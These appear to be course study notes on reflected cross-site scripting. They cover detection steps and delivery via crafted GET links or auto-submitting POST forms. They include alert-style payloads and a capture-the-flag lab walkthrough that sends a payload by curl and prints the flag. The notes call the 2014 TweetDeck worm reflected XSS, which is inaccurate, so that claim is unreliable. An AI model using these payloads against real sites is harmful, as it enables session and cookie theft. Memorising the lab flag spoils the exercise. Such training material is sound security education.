# Section 3 — Reflected XSS

---

## What Makes It Reflected

User input is echoed back in the immediate server response — in error messages, search results, or echoed parameters — without sanitization. The payload is **not stored**. It only executes for someone who follows a crafted link.

---

## Detection Flow

1. Submit a benign value → confirm it's echoed in the response (`Task 'test' could not be added.`)
2. Replace with XSS payload → confirm execution
3. Refresh the page without re-sending → payload should NOT execute (confirms it's reflected, not stored)

---

## Delivery Mechanism

Reflected XSS (Cross-Site Scripting) requires the victim to send the malicious input themselves. How the attacker delivers the payload depends on the HTTP method.

| Method | How attacker delivers payload |
|--------|-------------------------------|
| GET | Crafted URL with payload in query string (`?task=<script>...`) — sent via phishing link |
| POST | Trickier — needs a malicious page that auto-submits a form, or a CSRF-style attack |

Most reflected XSS in CTFs uses GET. Check the Network tab in browser DevTools to confirm the method.

```bash
# Inspect request method
curl -sk "http://TARGET/index.php?task=test" -v 2>&1 | grep '> '
```
> Sends a verbose request (`-v`) and filters for lines starting with `>` (the outgoing headers). Shows the method and path the request used.

---

## Sample Payloads (same as Stored)

```html
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
> These are quick proof-of-concept payloads. Use `window.origin` to show which page is running the script. Use `document.cookie` to see what cookies are accessible. The `<img>` and `<svg>` variants work when `<script>` is filtered.

---

## Lab — Reflected XSS

**Target:** `154.57.164.79:31042`

### Q1 — Flag via cookie disclosure

Same form as Section 2 but reflected — submit the payload as a GET parameter:

```
http://154.57.164.79:31042/index.php?task=<script>alert(document.cookie)</script>
```

The server reflects the payload in the error message and sets a flag cookie in the response. Capture it with curl:

```bash
curl -sk -G "http://154.57.164.79:31042/index.php" \
  --data-urlencode "task=<script>alert(document.cookie)</script>" \
  -i | grep -i set-cookie
# Set-Cookie: cookie=HTB{r3fl3c73d_b4ck_2_m3}
```
> Sends the payload as a GET parameter via `--data-urlencode` (handles special characters automatically) and prints headers (`-i`). The `grep` isolates the flag cookie.

**Flag:** `HTB{r3fl3c73d_b4ck_2_m3}`

---

## Exam Notes

- Reflected XSS requires victim interaction (clicking a link). It has lower severity than stored XSS, but it is easy to deliver via phishing.
- The "is it persistent?" check: load the page in a fresh tab without the malicious parameters. If the XSS still fires, it is stored, not reflected.
- GET-reflected XSS is the most common variant. Look in search parameters, error message echoes, and URL-based filters.
- POST-reflected XSS requires a Cross-Site Request Forgery (CSRF)-style delivery. It usually needs a separate XSS sink to escalate.
- Even non-persistent reflected XSS can be devastating at scale. The Twitter TweetDeck self-retweeting attack in 2014 used reflected XSS to spread to 38,000 users in two minutes.
